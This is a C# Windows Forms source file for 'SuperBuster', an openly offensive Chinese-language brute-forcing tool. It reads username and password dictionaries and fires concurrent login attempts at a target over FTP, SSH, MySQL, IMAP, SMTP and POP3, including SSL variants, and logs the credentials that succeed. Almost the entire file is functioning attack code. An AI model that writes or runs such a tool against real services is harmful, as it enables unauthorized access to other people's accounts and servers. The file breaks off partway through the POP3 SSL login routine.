using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Threading;
using Renci.SshNet;
using MySql.Data.MySqlClient;
using System.Diagnostics;
using Limilabs.Client.IMAP;
using Limilabs.Client.SMTP;
using Limilabs.Client.POP3;

namespace SuperBuster
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }
        string[] users;
        string[] passwords;
        string host;
        int currentrequestId = 0;
        Dictionary<int, bool> RequestIds = new Dictionary<int, bool>();
        private void button1_Click(object sender, EventArgs e)
        {

            Thread thread1 = new Thread(new ThreadStart(IncludeUser));
            thread1.ApartmentState = ApartmentState.STA;
            thread1.Start();
        }
        private void IncludeUser()
        {
            label3.Text = "正在导入用户名字典......";
            openFileDialog1.Filter = "文本文档|*.txt";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                users = File.ReadAllLines(openFileDialog1.FileName);
                label3.Text = "用户名字典已导入！";
            }
            else
            {
                label3.Text = "导入已取消！";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread thread2 = new Thread(new ThreadStart(IncludePassword));
            thread2.ApartmentState = ApartmentState.STA;
            thread2.Start();
        }
        private void IncludePassword()
        {
            label3.Text = "正在导入密码字典......";
            openFileDialog1.Filter = "文本文档|*.txt";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                passwords = File.ReadAllLines(openFileDialog1.FileName);
                label3.Text = "密码字典已导入！";
            }
            else
            {
                label3.Text = "导入已取消！";
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            int Number;
            bool IsNumber = int.TryParse(textBox2.Text, out Number);
            if (textBox1.Text == "")
            {
                MessageBox.Show("请输入目标！", "提示");
            }
            else if (textBox2.Text == "")
            {
                MessageBox.Show("请输入Task最大并发数量！", "提示");
            }
            else if (IsNumber == false)
            {
                MessageBox.Show("请输入正确的Task最大并发数量！", "提示");
            }
            else if (users == null)
            {
                MessageBox.Show("请导入用户名字典！", "提示");
            }
            else if (passwords == null)
            {
                MessageBox.Show("请导入密码字典！", "提示");
            }
            else if (button3.Text == "停止爆破")
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                RequestIds[currentrequestId] = false;
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                richTextBox3.Text += "爆破结束！";
                MessageBox.Show("爆破结束！", "提示");
            }
            else
            {
                host = textBox1.Text;
                if (comboBox1.SelectedItem.ToString() == "FTP")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行FTP爆破......";
                    MessageBox.Show("开始FTP爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread2 = new Thread(new ThreadStart(FTPBomb));
                    thread2.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "SSH")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行SSH爆破......";
                    MessageBox.Show("开始SSH爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread3 = new Thread(new ThreadStart(SSHBomb));
                    thread3.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "MySQL")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行MySQL爆破......";
                    MessageBox.Show("开始MySQL爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(MySQLBomb));
                    thread4.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "IMAP")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行IMAP爆破......";
                    MessageBox.Show("开始IMAP爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(IMAPBomb));
                    thread4.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "IMAP_SSL")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行IMAP_SSL爆破......";
                    MessageBox.Show("开始IMAP_SSL爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(IMAP_SSLBomb));
                    thread4.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "SMTP")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行SMTP爆破......";
                    MessageBox.Show("开始SMTP爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(SMTPBomb));
                    thread4.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "SMTP_SSL")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行SMTP_SSL爆破......";
                    MessageBox.Show("开始SMTP_SSL爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(SMTP_SSLBomb));
                    thread4.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "POP3")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行POP3爆破......";
                    MessageBox.Show("开始POP3爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(POP3Bomb));
                    thread4.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "POP3_SSL")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行POP3爆破......";
                    MessageBox.Show("开始POP3爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(POP3_SSLBomb));
                    thread4.Start();
                }
                else if (comboBox1.SelectedItem.ToString() == "HTTP_Proxy")
                {
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    comboBox1.Enabled = false;
                    checkBox1.Enabled = false;
                    richTextBox3.Clear();
                    label3.Text = "正在进行HTTP_Proxy爆破......";
                    MessageBox.Show("开始HTTP_Proxy爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(ProxyBomb));
                    thread4.Start();
                }
                else
                {
                    MessageBox.Show("请选择协议！", "提示");
                }
            }
        }
        private void FTPBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = FTPRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool FTPRequest(string host, string user, string password)
        {
            FtpWebRequest FTP = (FtpWebRequest)WebRequest.Create(new Uri("ftp://" + host));
            FTP.Method = WebRequestMethods.Ftp.ListDirectory;
            FTP.UseBinary = true;
            FTP.Credentials = new NetworkCredential(user, password);
            try
            {
                FtpWebResponse response = (FtpWebResponse)FTP.GetResponse();
                return true;
            }
            catch
            {
                return false;
            }
        }
        private void SSHBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = SSHRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool SSHRequest(string host, string user, string password)
        {
            var SSH = new SshClient(host, user, password);
            try
            {
                SSH.Connect();
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                SSH.Disconnect();
            }
        }
        private void MySQLBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = MySQLRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool MySQLRequest(string host, string user, string password)
        {
            string a = "server=" + host + ";port=3306;uid=" + user + ";pwd=" + password + ";" + "SslMode = none;";
            MySqlConnection conn = new MySqlConnection(a);
            try
            {
                conn.Open();
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                conn.Close();
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/7hr0wer/SuperBuster");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("邮箱反馈：thrower@thrower.cc", "提示");
        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("作者：Thrower\nQQ：3432653417\n邮箱：thrower@thrower.cc\nQQ交流灌水群1：801170943\nQQ交流灌水群2：631216511\n欢迎萌新及大佬加群！", "作者信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Process.Start("https://thrower.cc/");
        }
        private void IMAPBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = IMAPRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool IMAPRequest(string host, string user, string password)
        {
            Imap imap = new Imap();
            try
            {
                imap.Connect(host);
                imap.UseBestLogin(user, password);
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                imap.Close();
            }
        }
        private void IMAP_SSLBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = IMAP_SSLRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool IMAP_SSLRequest(string host, string user, string password)
        {
            Imap imap = new Imap();
            try
            {
                imap.ConnectSSL(host);
                imap.UseBestLogin(user, password);
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                imap.Close();
            }
        }
        private void SMTPBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = SMTPRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool SMTPRequest(string host, string user, string password)
        {
            Smtp smtp = new Smtp();
            try
            {
                smtp.Connect(host);
                smtp.UseBestLogin(user, password);
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                smtp.Close();
            }
        }
        private void SMTP_SSLBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = SMTP_SSLRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool SMTP_SSLRequest(string host, string user, string password)
        {
            Smtp smtp = new Smtp();
            try
            {
                smtp.ConnectSSL(host);
                smtp.UseBestLogin(user, password);
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                smtp.Close();
            }
        }

        private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {

            try
            {
                string a = Directory.GetCurrentDirectory() + "/Update/Update.exe";
                Process.Start(a);
            }
            catch
            {
                MessageBox.Show("没有找到更新程序！", "提示");
            }
        }
        private void POP3Bomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = POP3Request(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool POP3Request(string host,string user,string password)
        {
            Pop3 pop3 = new Pop3();
            try
            {
                pop3.Connect(host);
                pop3.UseBestLogin(user, password);
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                pop3.Close();
            }
        }
        private void POP3_SSLBomb()
        {
            currentrequestId++;
            int a = currentrequestId;
            RequestIds.Add(currentrequestId, true);
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
                    {
                        Task.WaitAny(TaskList.ToArray());
                    }
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        if (RequestIds[a])
                        {
                            bool result = POP3_SSLRequest(host, users[l], passwords[Y]);
                            if (result)
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        if (checkBox1.Checked)
                                        {
                                            RequestIds[a] = false;
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                            button3.Text = "开始爆破";
                                            label3.Text = "";
                                            richTextBox3.Text += "爆破结束！";
                                            textBox1.Enabled = true;
                                            textBox2.Enabled = true;
                                            button1.Enabled = true;
                                            button2.Enabled = true;
                                            comboBox1.Enabled = true;
                                            checkBox1.Enabled = true;
                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                        }
                                        else
                                        {
                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                BeginInvoke(new Action(() =>
                                {
                                    if (RequestIds[a])
                                    {
                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                    }
                                }));
                            }
                        }
                        else
                        {
                            return;
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (RequestIds[a])
            {
                button3.Text = "开始爆破";
                label3.Text = "";
                richTextBox3.Text += "爆破结束！";
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                comboBox1.Enabled = true;
                checkBox1.Enabled = true;
                MessageBox.Show("爆破结束！", "提示");
            }
        }
        private bool POP3_SSLRequest(string host, string user, string password)
        {
            Pop3 pop3 = new Pop3();
            try
            {
                pop3.ConnectSSL(host);
                pop3.UseBestLogin(user, password);
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                pop3.Close();
